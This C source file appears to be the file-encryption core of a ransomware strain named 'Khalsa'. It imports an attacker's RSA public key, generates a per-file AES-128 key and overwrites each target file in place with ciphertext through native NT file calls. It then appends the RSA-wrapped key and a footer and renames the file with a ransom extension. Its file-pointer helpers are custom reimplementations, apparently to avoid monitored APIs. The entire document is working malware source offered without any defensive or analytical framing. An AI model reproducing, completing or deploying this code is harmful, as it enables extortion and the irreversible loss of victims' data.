#include "khalsa_crypt.h"
#include "khalsa_clib.h"
#define KHALSA_CRYPT_BUFFER_SIZE 4096 /* 4KB */
HCRYPTPROV ghProvAES = 0, ghProvRSA = 0;
HCRYPTKEY ghPrivateKeyRSA = 0, ghPublicKeyRSA = 0;

typedef struct {
	LONGLONG llFileSize;
	DWORD dwKeySize, dwExportedSize, dwBufferSize;
} Khalsa_CRYPTO_FOOTER;


BOOL KhalsaCryptImportRSAPublicKey(HCRYPTKEY* phRSAKey, LPCWSTR pvBuffer)
{
	PBYTE pbDerKey = 0;
	DWORD dwDerSize = 0, dwPublicKeyInfoLen = 0;
	BOOL bStatus = FALSE;
	CERT_PUBLIC_KEY_INFO* pPublicKeyInfo = NULL;

	/* convert pem to der */
	if (!_CryptStringToBinaryW(pvBuffer, 0, CRYPT_STRING_BASE64HEADER,
		NULL, &dwDerSize, NULL, NULL)) {
		goto end;

	}

	pbDerKey = (PBYTE)_HeapAlloc(_GetProcessHeap(), 0, dwDerSize);
	if (!pbDerKey)
		goto end;

	if (!_CryptStringToBinaryW(pvBuffer, 0, CRYPT_STRING_BASE64HEADER,
		pbDerKey, &dwDerSize, NULL, NULL)) {


		goto end;
	}
	/* convert der to CERT_PUBLIC_KEY_INFO */
	if (!_CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO,
		pbDerKey, dwDerSize, CRYPT_ENCODE_ALLOC_FLAG, NULL,
		&pPublicKeyInfo, &dwPublicKeyInfoLen)) {

		goto end;

	}
	if (!_CryptImportPublicKeyInfo(ghProvRSA, X509_ASN_ENCODING,
		pPublicKeyInfo, phRSAKey)) {

		goto end;
	}
	bStatus = TRUE;
end:
	if (pbDerKey) _HeapFree(_GetProcessHeap(), 0, pbDerKey);
	if (pPublicKeyInfo) _LocalFree(pPublicKeyInfo);

	return bStatus;
}



DWORD KhalsaCryptEncryptedSize(HCRYPTKEY hKey, DWORD dwSize)
{
	DWORD dwEncryptedSize = dwSize;

	if (!_CryptEncrypt(hKey, 0, TRUE, 0, NULL, &dwEncryptedSize, 0))
		dwEncryptedSize = 0;

	return dwEncryptedSize;
}
DWORD KhalsaCryptExportedAESKeySize(HCRYPTKEY hAESKey)
{
	DWORD dwBlobLen;

	if (!_CryptExportKey(hAESKey, (HCRYPTKEY)NULL, PLAINTEXTKEYBLOB, 0, NULL, &dwBlobLen))
		dwBlobLen = 0;

	return dwBlobLen;
}


BOOL KhalsaCryptEncryptBlock(HCRYPTKEY hKey, PVOID pvBuffer,
	DWORD dwDataSize, DWORD dwChunkSize)
{
	return _CryptEncrypt(hKey, 0, TRUE, 0, (BYTE*)pvBuffer, &dwDataSize, dwChunkSize);
}

BOOL KhalsaCryptExportAESKey(HCRYPTKEY hAESKey, PVOID pvBuffer,
	DWORD dwBufferLen)
{
	return _CryptExportKey(hAESKey, (HCRYPTKEY)NULL, PLAINTEXTKEYBLOB,
		0, (BYTE*)pvBuffer, &dwBufferLen);
}
BOOL KhalsaCryptGenAESKey(HCRYPTKEY* phKeyAES)
{
	return _CryptGenKey(ghProvAES, CALG_AES_128, CRYPT_EXPORTABLE, phKeyAES);
}
VOID KhalsaCryptDestroyKey(HCRYPTKEY hKey)
{
	_CryptDestroyKey(hKey);
}


BOOL WINAPI MySetFilePointerEx(HANDLE hFile, LARGE_INTEGER liDistanceToMove, PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod) {
	NTSTATUS Status;
	IO_STATUS_BLOCK IoStatusBlock;
	FILE_POSITION_INFORMATION FilePosition;
	FILE_STANDARD_INFORMATION FileStandard;

	switch (dwMoveMethod)
	{
	case FILE_CURRENT:
	{
		Status = _NtQueryInformationFile(hFile, &IoStatusBlock, &FilePosition, sizeof(FILE_POSITION_INFORMATION), FilePositionInformation);
		if (!NT_SUCCESS(Status))
		{
			return FALSE;
		}

		FilePosition.CurrentByteOffset.QuadPart += liDistanceToMove.QuadPart;
		break;
	}

	case FILE_END:
	{
		Status = _NtQueryInformationFile(hFile, &IoStatusBlock, &FileStandard, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
		if (!NT_SUCCESS(Status))
		{
			return FALSE;
		}

		FilePosition.CurrentByteOffset.QuadPart = FileStandard.EndOfFile.QuadPart + liDistanceToMove.QuadPart;
		break;
	}

	case FILE_BEGIN:
	{
		FilePosition.CurrentByteOffset.QuadPart = liDistanceToMove.QuadPart;
		break;
	}

	default:
	{
		return FALSE;
	}
	}

	if (FilePosition.CurrentByteOffset.QuadPart < 0)
	{
		return FALSE;
	}

	Status = _NtSetInformationFile(hFile, &IoStatusBlock, &FilePosition, sizeof(FILE_POSITION_INFORMATION), FilePositionInformation);
	if (!NT_SUCCESS(Status))
	{
		return FALSE;
	}

	if (lpNewFilePointer != NULL)
	{
		*lpNewFilePointer = FilePosition.CurrentByteOffset;
	}
	return TRUE;
}


BOOL WINAPI MyGetFileSizeEx(HANDLE hFile, PLARGE_INTEGER lpFileSize) {
	NTSTATUS errCode;
	FILE_STANDARD_INFORMATION FileStandard;
	IO_STATUS_BLOCK IoStatusBlock;

	errCode = _NtQueryInformationFile(hFile, &IoStatusBlock, &FileStandard, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
	if (!NT_SUCCESS(errCode))
	{
		return FALSE;
	}
	if (lpFileSize)
		*lpFileSize = FileStandard.EndOfFile;

	return TRUE;
}
BOOL _KhalsaEncryptFile(HCRYPTKEY hKeyRSA, HCRYPTKEY hKeyAES, HANDLE hFile)
{
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	Khalsa_CRYPTO_FOOTER lcfFooter;
	LARGE_INTEGER liFileSize;
	LARGE_INTEGER liFilePointerOld, liFilePointerNew;
	LONGLONG llFileSize;
	PVOID pvExported = NULL, pvBuffer = NULL, pvReadBuffer = NULL;
	DWORD dwKeySize = 0, dwExportedSize = 0, dwBufferSize = KHALSA_CRYPT_BUFFER_SIZE,
		dwReadAheadSize = 0, dwBufferEncSize = 0, dwChunkSize;
	BOOL bStatus = FALSE;

	IO_STATUS_BLOCK Iosb;
	ZeroBuffer(&liFileSize, sizeof(LARGE_INTEGER));
	dwBufferEncSize = KhalsaCryptEncryptedSize(hKeyAES, dwBufferSize);
	if (dwBufferEncSize < dwBufferSize)
		goto end;

	pvBuffer = _HeapAlloc(_GetProcessHeap(), 0, dwBufferEncSize);
	if (!pvBuffer)
		goto end;

	dwReadAheadSize = dwBufferEncSize * dwBufferSize;

	pvReadBuffer = _HeapAlloc(_GetProcessHeap(), 0, dwReadAheadSize);
	if (!pvReadBuffer)
		goto end;

	if (!MyGetFileSizeEx(hFile, &liFileSize))
		goto end;

	llFileSize = liFileSize.QuadPart;
	if (llFileSize == 0)
		goto end;

	for (LONGLONG llIndex = 0; llIndex < llFileSize; llIndex += dwReadAheadSize)
	{
		liFilePointerOld.QuadPart = 0;

		if (!MySetFilePointerEx(hFile, liFilePointerOld, &liFilePointerNew, FILE_CURRENT))
			goto end;


		Status = _NtReadFile(hFile, NULL, NULL, NULL, &Iosb, pvReadBuffer, dwReadAheadSize, NULL, NULL);
		switch (Status) {
		case STATUS_END_OF_FILE:
			dwChunkSize = 0;
			break;
		case STATUS_SUCCESS:
			dwChunkSize = Iosb.Information;
			break;
		case STATUS_PENDING:
			goto end;
			break;

		default:
			goto end;
			break;
		}

		if (!MySetFilePointerEx(hFile, liFilePointerNew, &liFilePointerOld, FILE_BEGIN))
			goto end;

		for (DWORD dwChunkStart = 0; dwChunkStart < dwChunkSize; dwChunkStart += dwBufferSize)
		{
			_memcpy(pvBuffer, (PBYTE)pvReadBuffer + dwChunkStart, dwBufferSize);
			if (!KhalsaCryptEncryptBlock(hKeyAES, pvBuffer, dwBufferSize, dwBufferEncSize))
				goto end;

			
			Status = _NtWriteFile(hFile, NULL, NULL, NULL, &Iosb, (PVOID)pvBuffer, dwBufferEncSize, NULL, NULL);
			if (Status == STATUS_PENDING || !NT_SUCCESS(Status))
				goto end;
			
		}
	}

	dwKeySize = KhalsaCryptExportedAESKeySize(hKeyAES);
	dwExportedSize = KhalsaCryptEncryptedSize(hKeyRSA, dwKeySize);

	pvExported = _HeapAlloc(_GetProcessHeap(), 0, dwExportedSize);
	if (!pvExported)
		goto end;

	if (!KhalsaCryptExportAESKey(hKeyAES, pvExported, dwKeySize))
		goto end;

	if (!KhalsaCryptEncryptBlock(hKeyRSA, pvExported, dwKeySize, dwExportedSize))
		goto end;

	Status = _NtWriteFile(hFile, NULL, NULL, NULL, &Iosb, (PVOID)pvExported, dwExportedSize, NULL, NULL);

	if (Status == STATUS_PENDING || !NT_SUCCESS(Status))
		goto end;


	if (Iosb.Information != dwExportedSize)
		goto end;

	lcfFooter.dwKeySize = dwKeySize;
	lcfFooter.dwExportedSize = dwExportedSize;
	lcfFooter.llFileSize = llFileSize;


	Status = _NtWriteFile(hFile, NULL, NULL, NULL, &Iosb, (PVOID)&lcfFooter, sizeof(lcfFooter), NULL, NULL);
	if (Status == STATUS_PENDING || !NT_SUCCESS(Status))
		goto end;
	
	if (Iosb.Information != sizeof(lcfFooter))
		goto end;
	bStatus = TRUE;
end:

	if (pvExported)
	{
		ZeroBuffer(pvExported, dwExportedSize);
		_HeapFree(_GetProcessHeap(), 0, pvExported);
	}

	if (pvBuffer)
	{
		ZeroBuffer(pvBuffer, dwBufferEncSize);
		_HeapFree(_GetProcessHeap(), 0, pvBuffer);
	}

	if (pvReadBuffer)
	{
		ZeroBuffer(pvReadBuffer, dwBufferEncSize);
		_HeapFree(_GetProcessHeap(), 0, pvReadBuffer);
	}

	return bStatus;
}

BOOL KhalsaEncryptFile(HCRYPTKEY hKeyRSA, LPCWSTR lpszIn, LPCWSTR lpszOut)
{

	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	HANDLE hFile = INVALID_HANDLE_VALUE;
	HCRYPTKEY hKeyAES = 0;
	BOOL bStatus = FALSE;
	UNICODE_STRING usInFile, usOutFile;
	OBJECT_ATTRIBUTES ObjAttr;
	IO_STATUS_BLOCK IoStatusBlock;
	ULONG ulFileAttributes = (FILE_READ_ATTRIBUTES & (FILE_ATTRIBUTE_VALID_FLAGS & ~FILE_ATTRIBUTE_DIRECTORY));
	ULONG Flags = FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE | FILE_OPEN_FOR_BACKUP_INTENT | ((MOVEFILE_WRITE_THROUGH & MOVEFILE_WRITE_THROUGH) ? FILE_WRITE_THROUGH : 0);
	if (!lpszIn || !lpszOut)
		goto end;

	if ((_RtlDosPathNameToRelativeNtPathName_U(lpszIn, &usInFile, NULL, NULL)) == FALSE)
		goto end;

	if ((_RtlDosPathNameToRelativeNtPathName_U(lpszOut, &usOutFile, NULL, NULL)) == FALSE) {

		if (usInFile.Buffer) _HeapFree(_GetProcessHeap(), 0, usInFile.Buffer);
		goto end;
	}


	InitializeObjectAttributes(&ObjAttr, &usInFile, 0, NULL, NULL);


	if (!KhalsaCryptGenAESKey(&hKeyAES)) {

		if (usInFile.Buffer) _HeapFree(_GetProcessHeap(), 0, usInFile.Buffer);

		if (usOutFile.Buffer) _HeapFree(_GetProcessHeap(), 0, usOutFile.Buffer);

		goto end;
	}

	NTSTATUS status = _NtCreateFile(&hFile, FILE_GENERIC_READ | FILE_GENERIC_WRITE | DELETE, &ObjAttr, &IoStatusBlock, NULL, ulFileAttributes, 0, FILE_OPEN, Flags, NULL, 0);

	if (!NT_SUCCESS(status)) {

		if (usInFile.Buffer) _HeapFree(_GetProcessHeap(), 0, usInFile.Buffer);

		if (usOutFile.Buffer) _HeapFree(_GetProcessHeap(), 0, usOutFile.Buffer);

		goto end;
	}

	if (!_KhalsaEncryptFile(hKeyRSA, hKeyAES, hFile)) {

		if (usInFile.Buffer) _HeapFree(_GetProcessHeap(), 0, usInFile.Buffer);

		if (usOutFile.Buffer) _HeapFree(_GetProcessHeap(), 0, usOutFile.Buffer);

		goto end;

	}

	PFILE_RENAME_INFORMATION RenameInfo = _HeapAlloc(_GetProcessHeap(), 0, usOutFile.Length + sizeof(FILE_RENAME_INFORMATION));
	_memcpy(&RenameInfo->FileName, usOutFile.Buffer, usOutFile.Length);
	RenameInfo->ReplaceIfExists = FALSE;
	RenameInfo->RootDirectory = 0;
	RenameInfo->FileNameLength = usOutFile.Length;
	Status = _NtSetInformationFile(hFile, &IoStatusBlock, RenameInfo, usOutFile.Length + sizeof(FILE_RENAME_INFORMATION), FileRenameInformation);
	Status = _NtFlushBuffersFile(hFile, &IoStatusBlock);


	bStatus = TRUE;
end:
	if (hFile != INVALID_HANDLE_VALUE) _NtClose(hFile);

	hFile = INVALID_HANDLE_VALUE;

	if (hKeyAES) KhalsaCryptDestroyKey(hKeyAES);

	
	return bStatus;
}



BOOL KhalsaEncryptCryptoFunc(LPWSTR lpszPath)
{
	WCHAR lpszNewPath[MAX_PATH*2];
	ZeroBuffer(lpszNewPath, MAX_PATH * 2);
//	_memcpy(lpszNewPath, lpszPath, dwPath);
//	_memcpy(lpszNewPath + dwPath, KHALSA_EXTENSION, _wcslen(KHALSA_EXTENSION)*sizeof(WCHAR));

	_wsprintfW(lpszNewPath, L"%s.%s", lpszPath, KHALSA_EXTENSION);
	return KhalsaEncryptFile(ghPublicKeyRSA, lpszPath, lpszNewPath);

}




BOOL KhalsaCryptPrepareRSA() {
	if (ghProvRSA)
		return TRUE;

	if (!_CryptAcquireContextW(&ghProvRSA, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
	{
		if (_GetLastError() == NTE_BAD_KEYSET)
		{
			return _CryptAcquireContextW(&ghProvRSA, NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_NEWKEYSET);
		}

		return FALSE;
	}

	return TRUE;
}

BOOL KhalsaCryptPrepareAES() {
	if (ghProvAES)
		return TRUE;
	if (!_CryptAcquireContextW(&ghProvAES, NULL, NULL, PROV_RSA_AES, 0))
	{
		if (_GetLastError() == NTE_BAD_KEYSET)
		{
			return _CryptAcquireContextW(&ghProvAES, NULL, NULL, PROV_RSA_AES, CRYPT_NEWKEYSET);
		}
		return FALSE;
	}
	return TRUE;
}
BOOL KhalsaCryptDestroyRSA() {
	BOOL rv = FALSE;
	if (ghProvRSA)
		rv = _CryptReleaseContext(ghProvRSA, 0);

	return rv;
}
BOOL KhalsaCryptDestroyAES() {
	BOOL rv = FALSE;
	if (ghProvAES)
		rv = _CryptReleaseContext(ghProvAES, 0);

	return rv;
}
BOOL InitalizeCrypto(LPCWSTR lpszPublicKey) {
	BOOL rv = FALSE;
	if (KhalsaCryptPrepareRSA() && KhalsaCryptPrepareAES())
		rv = KhalsaCryptImportRSAPublicKey(&ghPublicKeyRSA, lpszPublicKey);


	return rv;
}

BOOL DeInitalizeCrypto() {
	return (KhalsaCryptDestroyRSA() && KhalsaCryptDestroyAES());
}